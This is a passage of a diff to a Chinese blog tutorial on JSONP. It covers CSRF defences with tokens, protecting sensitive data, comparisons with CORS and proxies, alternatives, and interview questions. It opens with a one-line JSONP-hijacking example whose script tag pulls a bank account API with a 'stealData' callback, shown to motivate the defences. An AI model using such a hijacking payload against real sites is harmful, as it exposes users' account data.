+&lt;script src=&quot;http://yourbank.com/api/account?callback=stealData&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p><strong>防御措施</strong>：</p>
+<ol>
+<li><strong>Token 验证</strong></li>
+</ol>
+<pre><code class="javascript">// 前端
+jsonp(&#123;
+  url: &#39;http://api.example.com/data&#39;,
+  data: &#123;
+    token: localStorage.getItem(&#39;csrf_token&#39;) // 从 Cookie 或 LocalStorage 获取
+  &#125;
+&#125;);
+
+// 后端
+router.get(&#39;/api/data&#39;, (ctx) =&gt; &#123;
+  const token = ctx.query.token;
+  const sessionToken = ctx.cookies.get(&#39;csrf_token&#39;);
+  
+  if (!token || token !== sessionToken) &#123;
+    ctx.status = 403;
+    ctx.body = &#39;Invalid CSRF token&#39;;
+    return;
+  &#125;
+  
+  // 处理请求
+&#125;);
+</code></pre>
+<ol start="2">
+<li><strong>敏感数据保护</strong></li>
+</ol>
+<pre><code class="javascript">// 不要通过 JSONP 暴露敏感信息
+// ❌ 错误做法
+router.get(&#39;/api/user&#39;, (ctx) =&gt; &#123;
+  ctx.body = `$&#123;callback&#125;($&#123;JSON.stringify(&#123;
+    name: &#39;John&#39;,
+    password: &#39;123456&#39;, // 泄露密码！
+    creditCard: &#39;4111111111111111&#39; // 泄露银行卡！
+  &#125;)&#125;)`;
+&#125;);
+
+// ✅ 正确做法
+router.get(&#39;/api/user&#39;, (ctx) =&gt; &#123;
+  ctx.body = `$&#123;callback&#125;($&#123;JSON.stringify(&#123;
+    name: &#39;John&#39;,
+    email: &#39;john@example.com&#39;
+    // 只返回非敏感信息
+  &#125;)&#125;)`;
+&#125;);
+</code></pre>
+<h2 id="六、JSONP-vs-其他跨域方案"><a href="#六、JSONP-vs-其他跨域方案" class="headerlink" title="六、JSONP vs 其他跨域方案"></a>六、JSONP vs 其他跨域方案</h2><h3 id="6-1-与-CORS-对比"><a href="#6-1-与-CORS-对比" class="headerlink" title="6.1 与 CORS 对比"></a>6.1 与 CORS 对比</h3><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>JSONP</th>
+<th>CORS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>支持的请求方法</td>
+<td>仅 GET</td>
+<td>GET、POST、PUT、DELETE 等</td>
+</tr>
+<tr>
+<td>浏览器支持</td>
+<td>所有浏览器（包括 IE6+）</td>
+<td>IE10+、现代浏览器</td>
+</tr>
+<tr>
+<td>错误处理</td>
+<td>困难，无法获取状态码</td>
+<td>完善，可获取完整响应</td>
+</tr>
+<tr>
+<td>安全性</td>
+<td>较低，存在 XSS 风险</td>
+<td>较高，支持多种安全策略</td>
+</tr>
+<tr>
+<td>请求头</td>
+<td>无法自定义</td>
+<td>可以自定义</td>
+</tr>
+<tr>
+<td>实现复杂度</td>
+<td>简单，无需特殊配置</td>
+<td>需要服务器设置响应头</td>
+</tr>
+<tr>
+<td>携带 Cookie</td>
+<td>自动携带</td>
+<td>需要设置 credentials</td>
+</tr>
+<tr>
+<td>现代应用</td>
+<td>逐渐淘汰</td>
+<td>主流方案</td>
+</tr>
+</tbody></table>
+<h3 id="6-2-与代理服务器对比"><a href="#6-2-与代理服务器对比" class="headerlink" title="6.2 与代理服务器对比"></a>6.2 与代理服务器对比</h3><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>JSONP</th>
+<th>代理服务器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>服务器负担</td>
+<td>无需额外服务器</td>
+<td>需要代理服务器转发请求</td>
+</tr>
+<tr>
+<td>性能</td>
+<td>直接请求目标服务器</td>
+<td>多一次转发，性能稍低</td>
+</tr>
+<tr>
+<td>灵活性</td>
+<td>受限于 GET 请求</td>
+<td>支持所有 HTTP 方法</td>
+</tr>
+<tr>
+<td>适用场景</td>
+<td>简单数据获取</td>
+<td>复杂业务场景</td>
+</tr>
+</tbody></table>
+<h3 id="6-3-方案选择建议"><a href="#6-3-方案选择建议" class="headerlink" title="6.3 方案选择建议"></a>6.3 方案选择建议</h3><pre><code>选择决策树：
+
+是否需要兼容 IE9 及以下？
+  ├─ 是 → 使用 JSONP
+  └─ 否 → 是否需要发送 POST/PUT 等请求？
+            ├─ 是 → 使用 CORS 或代理
+            └─ 否 → 是否可以控制服务器配置？
+                      ├─ 是 → 使用 CORS
+                      └─ 否 → 使用 JSONP 或代理
+</code></pre>
+<h2 id="七、实际应用场景"><a href="#七、实际应用场景" class="headerlink" title="七、实际应用场景"></a>七、实际应用场景</h2><h3 id="7-1-适用场景"><a href="#7-1-适用场景" class="headerlink" title="7.1 适用场景"></a>7.1 适用场景</h3><p><strong>1. 第三方 API 调用</strong></p>
+<pre><code class="javascript">// 调用百度搜索建议 API
+jsonp(&#123;
+  url: &#39;https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su&#39;,
+  data: &#123;
+    wd: &#39;JavaScript&#39;
+  &#125;,
+  callback: &#39;cb&#39;
+&#125;).then(data =&gt; &#123;
+  console.log(&#39;搜索建议:&#39;, data.s);
+&#125;);
+</code></pre>
+<p><strong>2. 跨域数据统计</strong></p>
+<pre><code class="javascript">// 跨域访问统计
+jsonp(&#123;
+  url: &#39;https://analytics.example.com/track&#39;,
+  data: &#123;
+    page: window.location.href,
+    referrer: document.referrer,
+    timestamp: Date.now()
+  &#125;
+&#125;);
+</code></pre>
+<h3 id="7-2-不适用场景"><a href="#7-2-不适用场景" class="headerlink" title="7.2 不适用场景"></a>7.2 不适用场景</h3><ul>
+<li>❌ 需要发送敏感数据（登录、支付）</li>
+<li>❌ 需要 POST&#x2F;PUT 等非 GET 请求</li>
+<li>❌ 需要精确的错误处理</li>
+<li>❌ 需要自定义请求头</li>
+<li>❌ 对安全性要求较高的场景</li>
 </ul>
-<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
-<li>XSS 风险</li>
-<li>CSRF 工具</li>
-<li>仅支持 GET 请求</li>
-<li>难以捕获 HTTP 错误</li>
+<h2 id="八、JSONP-的替代方案"><a href="#八、JSONP-的替代方案" class="headerlink" title="八、JSONP 的替代方案"></a>八、JSONP 的替代方案</h2><p>在现代 Web 开发中，推荐使用以下方案替代 JSONP：</p>
+<h3 id="8-1-CORS（推荐）"><a href="#8-1-CORS（推荐）" class="headerlink" title="8.1 CORS（推荐）"></a>8.1 CORS（推荐）</h3><pre><code class="javascript">// 前端
+fetch(&#39;http://api.example.com/data&#39;, &#123;
+  method: &#39;GET&#39;,
+  credentials: &#39;include&#39; // 携带 Cookie
+&#125;)
+  .then(response =&gt; response.json())
+  .then(data =&gt; console.log(data));
+
+// 后端（Express）
+app.use((req, res, next) =&gt; &#123;
+  res.header(&#39;Access-Control-Allow-Origin&#39;, &#39;https://mysite.com&#39;);
+  res.header(&#39;Access-Control-Allow-Methods&#39;, &#39;GET,POST,PUT,DELETE&#39;);
+  res.header(&#39;Access-Control-Allow-Credentials&#39;, &#39;true&#39;);
+  next();
+&#125;);
+</code></pre>
+<h3 id="8-2-postMessage"><a href="#8-2-postMessage" class="headerlink" title="8.2 postMessage"></a>8.2 postMessage</h3><pre><code class="javascript">// 父页面
+const iframe = document.getElementById(&#39;iframe&#39;);
+iframe.contentWindow.postMessage(&#39;getData&#39;, &#39;http://child.com&#39;);
+
+window.addEventListener(&#39;message&#39;, (event) =&gt; &#123;
+  if (event.origin === &#39;http://child.com&#39;) &#123;
+    console.log(&#39;收到数据:&#39;, event.data);
+  &#125;
+&#125;);
+
+// 子页面（iframe）
+window.addEventListener(&#39;message&#39;, (event) =&gt; &#123;
+  if (event.origin === &#39;http://parent.com&#39;) &#123;
+    event.source.postMessage(&#123;name: &#39;John&#39;&#125;, event.origin);
+  &#125;
+&#125;);
+</code></pre>
+<h3 id="8-3-WebSocket"><a href="#8-3-WebSocket" class="headerlink" title="8.3 WebSocket"></a>8.3 WebSocket</h3><pre><code class="javascript">// WebSocket 天然支持跨域
+const ws = new WebSocket(&#39;ws://api.example.com/socket&#39;);
+
+ws.onopen = function() &#123;
+  ws.send(&#39;Hello Server&#39;);
+&#125;;
+
+ws.onmessage = function(event) &#123;
+  console.log(&#39;收到消息:&#39;, event.data);
+&#125;;
+</code></pre>
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><h3 id="9-1-核心要点"><a href="#9-1-核心要点" class="headerlink" title="9.1 核心要点"></a>9.1 核心要点</h3><ol>
+<li><strong>原理</strong>：利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性</li>
+<li><strong>实现</strong>：动态创建 script，服务器返回函数调用</li>
+<li><strong>限制</strong>：仅支持 GET 请求</li>
+<li><strong>安全</strong>：存在 XSS 和 CSRF 风险，需要防御措施</li>
+</ol>
+<h3 id="9-2-最佳实践"><a href="#9-2-最佳实践" class="headerlink" title="9.2 最佳实践"></a>9.2 最佳实践</h3><ul>
+<li>✅ 仅在兼容旧浏览器时使用 JSONP</li>
+<li>✅ 对回调函数名进行验证</li>
+<li>✅ 检查请求来源（Referer）</li>
+<li>✅ 不暴露敏感数据</li>
+<li>✅ 实现超时和错误处理</li>
+<li>✅ 优先使用 CORS 替代 JSONP</li>
 </ul>
-</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a><a class="post-meta__tags" href="/tags/%E6%89%8B%E5%86%99API/">手写API</a><a class="post-meta__tags" href="/tags/%E8%B7%A8%E5%9F%9F/">跨域</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/handwrite-call-apply-bind/" title="手写call、apply、bind"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">手写call、apply、bind</div></div></a></div><div class="next-post pull-right"><a href="/posts/handwrite-deep-clone/" title="手写深拷贝"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">手写深拷贝</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">夜星</div><div class="author-info__description">专注全栈与AI技术的深度探索与实践，涵盖前端、后端、AI、架构设计、工程化、算法等方向的系统化技术博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XY0987"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XY0987" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">专注全栈与AI技术的深度探索与实践</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">JSONP 是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP-%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">JSONP 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.1.</span> <span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF"><span class="toc-number">2.2.</span> <span class="toc-text">服务器端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP-%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">JSONP 优缺点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">优点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">缺点</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/async-await-principle/" title="async和await实现原理">async和await实现原理</a><time datetime="2024-03-11T16:00:00.000Z" title="发表于 2024-03-12 00:00:00">2024-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/commonjs-esmodule/" title="CommonJS和ES Module的区别">CommonJS和ES Module的区别</a><time datetime="2024-02-02T16:00:00.000Z" title="发表于 2024-02-03 00:00:00">2024-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/handwrite-call-apply-bind/" title="手写call、apply、bind">手写call、apply、bind</a><time datetime="2023-12-22T16:00:00.000Z" title="发表于 2023-12-23 00:00:00">2023-12-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/handwrite-jsonp/" title="实现JSONP">实现JSONP</a><time datetime="2023-12-22T16:00:00.000Z" title="发表于 2023-12-23 00:00:00">2023-12-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/handwrite-deep-clone/" title="手写深拷贝">手写深拷贝</a><time datetime="2023-12-22T16:00:00.000Z" title="发表于 2023-12-23 00:00:00">2023-12-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2026 By 夜星</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/categories-order.js"></script><script src="/js/site-motto.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div>
+<h3 id="9-3-面试常见问题"><a href="#9-3-面试常见问题" class="headerlink" title="9.3 面试常见问题"></a>9.3 面试常见问题</h3><p><strong>Q1：JSONP 为什么只支持 GET 请求？</strong><br>A：因为 JSONP 利用的是 <code>&lt;script&gt;</code> 标签的 src 属性，而 src 只能发送 GET 请求。</p>
+<p><strong>Q2：JSONP 和 CORS 的区别？</strong><br>A：</p>
+<ul>
+<li>JSONP：仅 GET、兼容性好、安全性低、无法获取状态码</li>
+<li>CORS：支持所有方法、IE10+、安全性高、完整的错误处理</li>
+</ul>
+<p><strong>Q3：如何防止 JSONP 的 CSRF 攻击？</strong><br>A：</p>
+<ul>
+<li>Token 验证</li>
+<li>Referer 检查</li>
+<li>不暴露敏感接口</li>
+<li>使用 POST + CORS 替代</li>
+</ul>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a><a class="post-meta__tags" href="/tags/%E6%89%8B%E5%86%99API/">手写API</a><a class="post-meta__tags" href="/tags/%E8%B7%A8%E5%9F%9F/">跨域</a><a class="post-meta__tags" href="/tags/JSONP/">JSONP</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/handwrite-deep-clone/" title="JavaScript深拷贝完全指南：从浅拷贝到终极实现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JavaScript深拷贝完全指南：从浅拷贝到终极实现</div></div></a></div><div class="next-post pull-right"><a href="/posts/handwrite-promise/" title="手写promise,实现Promise/A+规范"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">手写promise,实现Promise/A+规范</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">夜星</div><div class="author-info__description">专注全栈与AI技术的深度探索与实践，涵盖前端、后端、AI、架构设计、工程化、算法等方向的系统化技术博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">74</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">129</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XY0987"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XY0987" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">专注全栈与AI技术的深度探索与实践</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-JSONP"><span class="toc-number">1.</span> <span class="toc-text">前言：为什么需要 JSONP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81JSONP-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.</span> <span class="toc-text">一、JSONP 是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81JSONP-%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">二、JSONP 原理详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E-script-%E6%A0%87%E7%AD%BE"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 同源策略与 script 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">2.2 工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.3.</span> <span class="toc-text">2.3 简单示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%AE%9E%E7%8E%B0%EF%BC%88Node-js%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">服务器端实现（Node.js）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%89%8B%E5%86%99-JSONP-%E5%B0%81%E8%A3%85%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">三、手写 JSONP 封装函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%9F%BA%E7%A1%80%E7%89%88%E6%9C%AC"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 基础版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%AE%8C%E6%95%B4%E7%89%88%E6%9C%AC%EF%BC%88%E6%94%AF%E6%8C%81%E9%85%8D%E7%BD%AE%E5%92%8C%E8%B6%85%E6%97%B6%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 完整版本（支持配置和超时）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%94%AF%E6%8C%81%E5%8F%96%E6%B6%88%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 支持取消的版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81JSONP-%E4%BC%98%E7%BC%BA%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">四、JSONP 优缺点分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E4%BC%98%E7%82%B9"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 优点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E7%BC%BA%E7%82%B9"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 缺点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98%E8%AF%A6%E8%A7%A3"><span class="toc-number">6.</span> <span class="toc-text">五、安全性问题详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-XSS-%E6%94%BB%E5%87%BB%E9%A3%8E%E9%99%A9"><span class="toc-number">6.1.</span> <span class="toc-text">5.1 XSS 攻击风险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-CSRF-%E6%94%BB%E5%87%BB%E9%A3%8E%E9%99%A9"><span class="toc-number">6.2.</span> <span class="toc-text">5.2 CSRF 攻击风险</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81JSONP-vs-%E5%85%B6%E4%BB%96%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88"><span class="toc-number">7.</span> <span class="toc-text">六、JSONP vs 其他跨域方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E4%B8%8E-CORS-%E5%AF%B9%E6%AF%94"><span class="toc-number">7.1.</span> <span class="toc-text">6.1 与 CORS 对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E4%B8%8E%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E6%AF%94"><span class="toc-number">7.2.</span> <span class="toc-text">6.2 与代理服务器对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E6%96%B9%E6%A1%88%E9%80%89%E6%8B%A9%E5%BB%BA%E8%AE%AE"><span class="toc-number">7.3.</span> <span class="toc-text">6.3 方案选择建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">8.</span> <span class="toc-text">七、实际应用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">8.1.</span> <span class="toc-text">7.1 适用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E4%B8%8D%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">8.2.</span> <span class="toc-text">7.2 不适用场景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81JSONP-%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88"><span class="toc-number">9.</span> <span class="toc-text">八、JSONP 的替代方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-CORS%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-number">9.1.</span> <span class="toc-text">8.1 CORS（推荐）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-postMessage"><span class="toc-number">9.2.</span> <span class="toc-text">8.2 postMessage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-WebSocket"><span class="toc-number">9.3.</span> <span class="toc-text">8.3 WebSocket</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">九、总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1-%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9"><span class="toc-number">10.1.</span> <span class="toc-text">9.1 核心要点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2-%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">10.2.</span> <span class="toc-text">9.2 最佳实践</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3-%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">10.3.</span> <span class="toc-text">9.3 面试常见问题</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/11-OpenClaw%E4%B8%8E%E4%B8%AA%E4%BA%BAAI%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" title="OpenClaw：本地优先的个人AI操作系统">OpenClaw：本地优先的个人AI操作系统</a><time datetime="2026-03-02T16:00:00.000Z" title="发表于 2026 00:00:00">2026</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/10-Skills%E4%B8%8EMCP%E5%AF%B9%E6%AF%94%E8%A7%A3%E6%9E%90/" title="Skills与MCP对比解析：AI能力封装的两种路径">Skills与MCP对比解析：AI能力封装的两种路径</a><time datetime="2026-02-14T16:00:00.000Z" title="发表于 2026 00:00:00">2026</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/09-OpenSpec%E4%B8%8E%E8%A7%84%E8%8C%83%E9%A9%B1%E5%8A%A8AI%E7%BC%96%E7%A8%8B/" title="OpenSpec：规范驱动的AI编程">OpenSpec：规范驱动的AI编程</a><time datetime="2025-11-24T16:00:00.000Z" title="发表于 2025 00:00:00">2025</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/08-Vibe-Coding-AI%E7%BC%96%E7%A8%8B%E6%96%B0%E8%8C%83%E5%BC%8F/" title="Vibe Coding：AI编程新范式">Vibe Coding：AI编程新范式</a><time datetime="2025-10-09T16:00:00.000Z" title="发表于 2025 00:00:00">2025</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/07-AI-Agent%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E8%B7%B5/" title="AI Agent架构设计与实践">AI Agent架构设计与实践</a><time datetime="2025-09-24T16:00:00.000Z" title="发表于 2025 00:00:00">2025</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2026 By 夜星</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/categories-order.js"></script><script src="/js/site-motto.js"></script><script src="/js/custom-post-count.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div>
         <style>
             [bg-lazy] {
                 background-image: none !important;
